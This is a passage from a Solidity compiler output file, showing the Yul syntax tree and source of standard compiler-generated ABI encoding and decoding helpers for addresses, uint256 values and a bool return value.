																	"variableNames": [
																		{
																			"name": "value0",
																			"nativeSrc": "1498:6:2",
																			"nodeType": "YulIdentifier",
																			"src": "1498:6:2"
																		}
																	]
																}
															]
														},
														{
															"nativeSrc": "1581:118:2",
															"nodeType": "YulBlock",
															"src": "1581:118:2",
															"statements": [
																{
																	"nativeSrc": "1596:16:2",
																	"nodeType": "YulVariableDeclaration",
																	"src": "1596:16:2",
																	"value": {
																		"kind": "number",
																		"nativeSrc": "1610:2:2",
																		"nodeType": "YulLiteral",
																		"src": "1610:2:2",
																		"type": "",
																		"value": "32"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nativeSrc": "1600:6:2",
																			"nodeType": "YulTypedName",
																			"src": "1600:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nativeSrc": "1626:63:2",
																	"nodeType": "YulAssignment",
																	"src": "1626:63:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nativeSrc": "1661:9:2",
																						"nodeType": "YulIdentifier",
																						"src": "1661:9:2"
																					},
																					{
																						"name": "offset",
																						"nativeSrc": "1672:6:2",
																						"nodeType": "YulIdentifier",
																						"src": "1672:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nativeSrc": "1657:3:2",
																					"nodeType": "YulIdentifier",
																					"src": "1657:3:2"
																				},
																				"nativeSrc": "1657:22:2",
																				"nodeType": "YulFunctionCall",
																				"src": "1657:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nativeSrc": "1681:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "1681:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address",
																			"nativeSrc": "1636:20:2",
																			"nodeType": "YulIdentifier",
																			"src": "1636:20:2"
																		},
																		"nativeSrc": "1636:53:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1636:53:2"
																	},
																	"variableNames": [
																		{
																			"name": "value1",
																			"nativeSrc": "1626:6:2",
																			"nodeType": "YulIdentifier",
																			"src": "1626:6:2"
																		}
																	]
																}
															]
														},
														{
															"nativeSrc": "1709:118:2",
															"nodeType": "YulBlock",
															"src": "1709:118:2",
															"statements": [
																{
																	"nativeSrc": "1724:16:2",
																	"nodeType": "YulVariableDeclaration",
																	"src": "1724:16:2",
																	"value": {
																		"kind": "number",
																		"nativeSrc": "1738:2:2",
																		"nodeType": "YulLiteral",
																		"src": "1738:2:2",
																		"type": "",
																		"value": "64"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nativeSrc": "1728:6:2",
																			"nodeType": "YulTypedName",
																			"src": "1728:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nativeSrc": "1754:63:2",
																	"nodeType": "YulAssignment",
																	"src": "1754:63:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nativeSrc": "1789:9:2",
																						"nodeType": "YulIdentifier",
																						"src": "1789:9:2"
																					},
																					{
																						"name": "offset",
																						"nativeSrc": "1800:6:2",
																						"nodeType": "YulIdentifier",
																						"src": "1800:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nativeSrc": "1785:3:2",
																					"nodeType": "YulIdentifier",
																					"src": "1785:3:2"
																				},
																				"nativeSrc": "1785:22:2",
																				"nodeType": "YulFunctionCall",
																				"src": "1785:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nativeSrc": "1809:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "1809:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address",
																			"nativeSrc": "1764:20:2",
																			"nodeType": "YulIdentifier",
																			"src": "1764:20:2"
																		},
																		"nativeSrc": "1764:53:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1764:53:2"
																	},
																	"variableNames": [
																		{
																			"name": "value2",
																			"nativeSrc": "1754:6:2",
																			"nodeType": "YulIdentifier",
																			"src": "1754:6:2"
																		}
																	]
																}
															]
														},
														{
															"nativeSrc": "1837:118:2",
															"nodeType": "YulBlock",
															"src": "1837:118:2",
															"statements": [
																{
																	"nativeSrc": "1852:16:2",
																	"nodeType": "YulVariableDeclaration",
																	"src": "1852:16:2",
																	"value": {
																		"kind": "number",
																		"nativeSrc": "1866:2:2",
																		"nodeType": "YulLiteral",
																		"src": "1866:2:2",
																		"type": "",
																		"value": "96"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nativeSrc": "1856:6:2",
																			"nodeType": "YulTypedName",
																			"src": "1856:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nativeSrc": "1882:63:2",
																	"nodeType": "YulAssignment",
																	"src": "1882:63:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nativeSrc": "1917:9:2",
																						"nodeType": "YulIdentifier",
																						"src": "1917:9:2"
																					},
																					{
																						"name": "offset",
																						"nativeSrc": "1928:6:2",
																						"nodeType": "YulIdentifier",
																						"src": "1928:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nativeSrc": "1913:3:2",
																					"nodeType": "YulIdentifier",
																					"src": "1913:3:2"
																				},
																				"nativeSrc": "1913:22:2",
																				"nodeType": "YulFunctionCall",
																				"src": "1913:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nativeSrc": "1937:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "1937:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_uint256",
																			"nativeSrc": "1892:20:2",
																			"nodeType": "YulIdentifier",
																			"src": "1892:20:2"
																		},
																		"nativeSrc": "1892:53:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1892:53:2"
																	},
																	"variableNames": [
																		{
																			"name": "value3",
																			"nativeSrc": "1882:6:2",
																			"nodeType": "YulIdentifier",
																			"src": "1882:6:2"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_addresst_addresst_addresst_uint256",
												"nativeSrc": "1197:765:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "1260:9:2",
														"nodeType": "YulTypedName",
														"src": "1260:9:2",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nativeSrc": "1271:7:2",
														"nodeType": "YulTypedName",
														"src": "1271:7:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nativeSrc": "1283:6:2",
														"nodeType": "YulTypedName",
														"src": "1283:6:2",
														"type": ""
													},
													{
														"name": "value1",
														"nativeSrc": "1291:6:2",
														"nodeType": "YulTypedName",
														"src": "1291:6:2",
														"type": ""
													},
													{
														"name": "value2",
														"nativeSrc": "1299:6:2",
														"nodeType": "YulTypedName",
														"src": "1299:6:2",
														"type": ""
													},
													{
														"name": "value3",
														"nativeSrc": "1307:6:2",
														"nodeType": "YulTypedName",
														"src": "1307:6:2",
														"type": ""
													}
												],
												"src": "1197:765:2"
											},
											{
												"body": {
													"nativeSrc": "2033:53:2",
													"nodeType": "YulBlock",
													"src": "2033:53:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "2050:3:2",
																		"nodeType": "YulIdentifier",
																		"src": "2050:3:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "2073:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "2073:5:2"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_address",
																			"nativeSrc": "2055:17:2",
																			"nodeType": "YulIdentifier",
																			"src": "2055:17:2"
																		},
																		"nativeSrc": "2055:24:2",
																		"nodeType": "YulFunctionCall",
																		"src": "2055:24:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "2043:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "2043:6:2"
																},
																"nativeSrc": "2043:37:2",
																"nodeType": "YulFunctionCall",
																"src": "2043:37:2"
															},
															"nativeSrc": "2043:37:2",
															"nodeType": "YulExpressionStatement",
															"src": "2043:37:2"
														}
													]
												},
												"name": "abi_encode_t_address_to_t_address_fromStack",
												"nativeSrc": "1968:118:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "2021:5:2",
														"nodeType": "YulTypedName",
														"src": "2021:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nativeSrc": "2028:3:2",
														"nodeType": "YulTypedName",
														"src": "2028:3:2",
														"type": ""
													}
												],
												"src": "1968:118:2"
											},
											{
												"body": {
													"nativeSrc": "2157:53:2",
													"nodeType": "YulBlock",
													"src": "2157:53:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "2174:3:2",
																		"nodeType": "YulIdentifier",
																		"src": "2174:3:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "2197:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "2197:5:2"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_uint256",
																			"nativeSrc": "2179:17:2",
																			"nodeType": "YulIdentifier",
																			"src": "2179:17:2"
																		},
																		"nativeSrc": "2179:24:2",
																		"nodeType": "YulFunctionCall",
																		"src": "2179:24:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "2167:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "2167:6:2"
																},
																"nativeSrc": "2167:37:2",
																"nodeType": "YulFunctionCall",
																"src": "2167:37:2"
															},
															"nativeSrc": "2167:37:2",
															"nodeType": "YulExpressionStatement",
															"src": "2167:37:2"
														}
													]
												},
												"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
												"nativeSrc": "2092:118:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "2145:5:2",
														"nodeType": "YulTypedName",
														"src": "2145:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nativeSrc": "2152:3:2",
														"nodeType": "YulTypedName",
														"src": "2152:3:2",
														"type": ""
													}
												],
												"src": "2092:118:2"
											},
											{
												"body": {
													"nativeSrc": "2370:288:2",
													"nodeType": "YulBlock",
													"src": "2370:288:2",
													"statements": [
														{
															"nativeSrc": "2380:26:2",
															"nodeType": "YulAssignment",
															"src": "2380:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nativeSrc": "2392:9:2",
																		"nodeType": "YulIdentifier",
																		"src": "2392:9:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "2403:2:2",
																		"nodeType": "YulLiteral",
																		"src": "2403:2:2",
																		"type": "",
																		"value": "96"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nativeSrc": "2388:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "2388:3:2"
																},
																"nativeSrc": "2388:18:2",
																"nodeType": "YulFunctionCall",
																"src": "2388:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nativeSrc": "2380:4:2",
																	"nodeType": "YulIdentifier",
																	"src": "2380:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nativeSrc": "2460:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "2460:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nativeSrc": "2473:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "2473:9:2"
																			},
																			{
																				"kind": "number",
																				"nativeSrc": "2484:1:2",
																				"nodeType": "YulLiteral",
																				"src": "2484:1:2",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "2469:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "2469:3:2"
																		},
																		"nativeSrc": "2469:17:2",
																		"nodeType": "YulFunctionCall",
																		"src": "2469:17:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_address_to_t_address_fromStack",
																	"nativeSrc": "2416:43:2",
																	"nodeType": "YulIdentifier",
																	"src": "2416:43:2"
																},
																"nativeSrc": "2416:71:2",
																"nodeType": "YulFunctionCall",
																"src": "2416:71:2"
															},
															"nativeSrc": "2416:71:2",
															"nodeType": "YulExpressionStatement",
															"src": "2416:71:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value1",
																		"nativeSrc": "2541:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "2541:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nativeSrc": "2554:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "2554:9:2"
																			},
																			{
																				"kind": "number",
																				"nativeSrc": "2565:2:2",
																				"nodeType": "YulLiteral",
																				"src": "2565:2:2",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "2550:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "2550:3:2"
																		},
																		"nativeSrc": "2550:18:2",
																		"nodeType": "YulFunctionCall",
																		"src": "2550:18:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_address_to_t_address_fromStack",
																	"nativeSrc": "2497:43:2",
																	"nodeType": "YulIdentifier",
																	"src": "2497:43:2"
																},
																"nativeSrc": "2497:72:2",
																"nodeType": "YulFunctionCall",
																"src": "2497:72:2"
															},
															"nativeSrc": "2497:72:2",
															"nodeType": "YulExpressionStatement",
															"src": "2497:72:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value2",
																		"nativeSrc": "2623:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "2623:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nativeSrc": "2636:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "2636:9:2"
																			},
																			{
																				"kind": "number",
																				"nativeSrc": "2647:2:2",
																				"nodeType": "YulLiteral",
																				"src": "2647:2:2",
																				"type": "",
																				"value": "64"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "2632:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "2632:3:2"
																		},
																		"nativeSrc": "2632:18:2",
																		"nodeType": "YulFunctionCall",
																		"src": "2632:18:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
																	"nativeSrc": "2579:43:2",
																	"nodeType": "YulIdentifier",
																	"src": "2579:43:2"
																},
																"nativeSrc": "2579:72:2",
																"nodeType": "YulFunctionCall",
																"src": "2579:72:2"
															},
															"nativeSrc": "2579:72:2",
															"nodeType": "YulExpressionStatement",
															"src": "2579:72:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_address_t_address_t_uint256__to_t_address_t_address_t_uint256__fromStack_reversed",
												"nativeSrc": "2216:442:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "2326:9:2",
														"nodeType": "YulTypedName",
														"src": "2326:9:2",
														"type": ""
													},
													{
														"name": "value2",
														"nativeSrc": "2338:6:2",
														"nodeType": "YulTypedName",
														"src": "2338:6:2",
														"type": ""
													},
													{
														"name": "value1",
														"nativeSrc": "2346:6:2",
														"nodeType": "YulTypedName",
														"src": "2346:6:2",
														"type": ""
													},
													{
														"name": "value0",
														"nativeSrc": "2354:6:2",
														"nodeType": "YulTypedName",
														"src": "2354:6:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nativeSrc": "2365:4:2",
														"nodeType": "YulTypedName",
														"src": "2365:4:2",
														"type": ""
													}
												],
												"src": "2216:442:2"
											},
											{
												"body": {
													"nativeSrc": "2706:48:2",
													"nodeType": "YulBlock",
													"src": "2706:48:2",
													"statements": [
														{
															"nativeSrc": "2716:32:2",
															"nodeType": "YulAssignment",
															"src": "2716:32:2",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "2741:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "2741:5:2"
																			}
																		],
																		"functionName": {
																			"name": "iszero",
																			"nativeSrc": "2734:6:2",
																			"nodeType": "YulIdentifier",
																			"src": "2734:6:2"
																		},
																		"nativeSrc": "2734:13:2",
																		"nodeType": "YulFunctionCall",
																		"src": "2734:13:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "2727:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "2727:6:2"
																},
																"nativeSrc": "2727:21:2",
																"nodeType": "YulFunctionCall",
																"src": "2727:21:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "2716:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "2716:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bool",
												"nativeSrc": "2664:90:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "2688:5:2",
														"nodeType": "YulTypedName",
														"src": "2688:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "2698:7:2",
														"nodeType": "YulTypedName",
														"src": "2698:7:2",
														"type": ""
													}
												],
												"src": "2664:90:2"
											},
											{
												"body": {
													"nativeSrc": "2800:76:2",
													"nodeType": "YulBlock",
													"src": "2800:76:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "2854:16:2",
																"nodeType": "YulBlock",
																"src": "2854:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nativeSrc": "2863:1:2",
																					"nodeType": "YulLiteral",
																					"src": "2863:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nativeSrc": "2866:1:2",
																					"nodeType": "YulLiteral",
																					"src": "2866:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nativeSrc": "2856:6:2",
																				"nodeType": "YulIdentifier",
																				"src": "2856:6:2"
																			},
																			"nativeSrc": "2856:12:2",
																			"nodeType": "YulFunctionCall",
																			"src": "2856:12:2"
																		},
																		"nativeSrc": "2856:12:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "2856:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "2823:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "2823:5:2"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nativeSrc": "2845:5:2",
																						"nodeType": "YulIdentifier",
																						"src": "2845:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_bool",
																					"nativeSrc": "2830:14:2",
																					"nodeType": "YulIdentifier",
																					"src": "2830:14:2"
																				},
																				"nativeSrc": "2830:21:2",
																				"nodeType": "YulFunctionCall",
																				"src": "2830:21:2"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nativeSrc": "2820:2:2",
																			"nodeType": "YulIdentifier",
																			"src": "2820:2:2"
																		},
																		"nativeSrc": "2820:32:2",
																		"nodeType": "YulFunctionCall",
																		"src": "2820:32:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "2813:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "2813:6:2"
																},
																"nativeSrc": "2813:40:2",
																"nodeType": "YulFunctionCall",
																"src": "2813:40:2"
															},
															"nativeSrc": "2810:60:2",
															"nodeType": "YulIf",
															"src": "2810:60:2"
														}
													]
												},
												"name": "validator_revert_t_bool",
												"nativeSrc": "2760:116:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "2793:5:2",
														"nodeType": "YulTypedName",
														"src": "2793:5:2",
														"type": ""
													}
												],
												"src": "2760:116:2"
											},
											{
												"body": {
													"nativeSrc": "2942:77:2",
													"nodeType": "YulBlock",
													"src": "2942:77:2",
													"statements": [
														{
															"nativeSrc": "2952:22:2",
															"nodeType": "YulAssignment",
															"src": "2952:22:2",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nativeSrc": "2967:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "2967:6:2"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "2961:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "2961:5:2"
																},
																"nativeSrc": "2961:13:2",
																"nodeType": "YulFunctionCall",
																"src": "2961:13:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nativeSrc": "2952:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "2952:5:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "3007:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "3007:5:2"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_bool",
																	"nativeSrc": "2983:23:2",
																	"nodeType": "YulIdentifier",
																	"src": "2983:23:2"
																},
																"nativeSrc": "2983:30:2",
																"nodeType": "YulFunctionCall",
																"src": "2983:30:2"
															},
															"nativeSrc": "2983:30:2",
															"nodeType": "YulExpressionStatement",
															"src": "2983:30:2"
														}
													]
												},
												"name": "abi_decode_t_bool_fromMemory",
												"nativeSrc": "2882:137:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nativeSrc": "2920:6:2",
														"nodeType": "YulTypedName",
														"src": "2920:6:2",
														"type": ""
													},
													{
														"name": "end",
														"nativeSrc": "2928:3:2",
														"nodeType": "YulTypedName",
														"src": "2928:3:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nativeSrc": "2936:5:2",
														"nodeType": "YulTypedName",
														"src": "2936:5:2",
														"type": ""
													}
												],
												"src": "2882:137:2"
											},
											{
												"body": {
													"nativeSrc": "3099:271:2",
													"nodeType": "YulBlock",
													"src": "3099:271:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "3145:83:2",
																"nodeType": "YulBlock",
																"src": "3145:83:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nativeSrc": "3147:77:2",
																				"nodeType": "YulIdentifier",
																				"src": "3147:77:2"
																			},
																			"nativeSrc": "3147:79:2",
																			"nodeType": "YulFunctionCall",
																			"src": "3147:79:2"
																		},
																		"nativeSrc": "3147:79:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "3147:79:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nativeSrc": "3120:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "3120:7:2"
																			},
																			{
																				"name": "headStart",
																				"nativeSrc": "3129:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "3129:9:2"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nativeSrc": "3116:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "3116:3:2"
																		},
																		"nativeSrc": "3116:23:2",
																		"nodeType": "YulFunctionCall",
																		"src": "3116:23:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "3141:2:2",
																		"nodeType": "YulLiteral",
																		"src": "3141:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nativeSrc": "3112:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "3112:3:2"
																},
																"nativeSrc": "3112:32:2",
																"nodeType": "YulFunctionCall",
																"src": "3112:32:2"
															},
															"nativeSrc": "3109:119:2",
															"nodeType": "YulIf",
															"src": "3109:119:2"
														},
														{
															"nativeSrc": "3238:125:2",
															"nodeType": "YulBlock",
															"src": "3238:125:2",
															"statements": [
																{
																	"nativeSrc": "3253:15:2",
																	"nodeType": "YulVariableDeclaration",
																	"src": "3253:15:2",
																	"value": {
																		"kind": "number",
																		"nativeSrc": "3267:1:2",
																		"nodeType": "YulLiteral",
																		"src": "3267:1:2",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nativeSrc": "3257:6:2",
																			"nodeType": "YulTypedName",
																			"src": "3257:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nativeSrc": "3282:71:2",
																	"nodeType": "YulAssignment",
																	"src": "3282:71:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nativeSrc": "3325:9:2",
																						"nodeType": "YulIdentifier",
																						"src": "3325:9:2"
																					},
																					{
																						"name": "offset",
																						"nativeSrc": "3336:6:2",
																						"nodeType": "YulIdentifier",
																						"src": "3336:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nativeSrc": "3321:3:2",
																					"nodeType": "YulIdentifier",
																					"src": "3321:3:2"
																				},
																				"nativeSrc": "3321:22:2",
																				"nodeType": "YulFunctionCall",
																				"src": "3321:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nativeSrc": "3345:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "3345:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_bool_fromMemory",
																			"nativeSrc": "3292:28:2",
																			"nodeType": "YulIdentifier",
																			"src": "3292:28:2"
																		},
																		"nativeSrc": "3292:61:2",
																		"nodeType": "YulFunctionCall",
																		"src": "3292:61:2"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nativeSrc": "3282:6:2",
																			"nodeType": "YulIdentifier",
																			"src": "3282:6:2"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_bool_fromMemory",
												"nativeSrc": "3025:345:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "3069:9:2",
														"nodeType": "YulTypedName",
														"src": "3069:9:2",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nativeSrc": "3080:7:2",
														"nodeType": "YulTypedName",
														"src": "3080:7:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nativeSrc": "3092:6:2",
														"nodeType": "YulTypedName",
														"src": "3092:6:2",
														"type": ""
													}
												],
												"src": "3025:345:2"
											}
										]
									},
									"contents": "{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function validator_revert_t_uint256(value) {\n        if iszero(eq(value, cleanup_t_uint256(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_uint256(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_uint256(value)\n    }\n\n    function abi_decode_tuple_t_addresst_addresst_addresst_uint256(headStart, dataEnd) -> value0, value1, value2, value3 {\n        if slt(sub(dataEnd, headStart), 128) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 32\n\n            value1 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 64\n\n            value2 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 96\n\n            value3 := abi_decode_t_uint256(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_address_t_address_t_uint256__to_t_address_t_address_t_uint256__fromStack_reversed(headStart , value2, value1, value0) -> tail {\n        tail := add(headStart, 96)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n        abi_encode_t_address_to_t_address_fromStack(value1,  add(headStart, 32))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value2,  add(headStart, 64))\n\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function validator_revert_t_bool(value) {\n        if iszero(eq(value, cleanup_t_bool(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_bool_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_bool(value)\n    }\n\n    function abi_decode_tuple_t_bool_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bool_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n}\n",
									"id": 2,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
